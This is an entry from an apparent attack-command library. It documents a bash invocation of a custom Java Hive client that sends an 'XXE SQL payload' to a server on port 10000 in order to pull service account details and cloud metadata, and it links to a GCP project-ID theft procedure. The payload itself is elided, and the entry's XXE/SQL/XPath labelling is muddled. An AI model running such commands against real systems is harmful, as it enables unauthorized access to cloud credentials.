---
id: uuid-c8
data: 'java -classpath ''.:./runtime/*'' QueryHive IP:10000 $CMD'
tags:
  - xxe
  - execution
type: command
output: 'Output from XXE query, e.g., service account details'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.596Z'
verified: false
validated: true
submitted: true
---
# java-queryhive-xxe

## Command

```bash
java -classpath '.:./runtime/*' QueryHive IP:10000 $CMD
```

## Description

Runs an XXE SQL payload via the custom Java Hive client, where $CMD holds the exploit query.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -classpath '.:./runtime/*' | JAR classpath | Yes |
| IP:10000 | Server address | Yes |
| $CMD | XXE SQL variable | Yes |

## Examples

### Basic Usage

```bash
CMD="select xpath_string..." java -classpath '.:./runtime/*' QueryHive IP:10000 $CMD
```

## Expected Output

Results from the XXE payload, such as metadata data.

## Related

- [[Related Procedure: Execute-XXE-to-Fetch-GCP-Project-ID]]
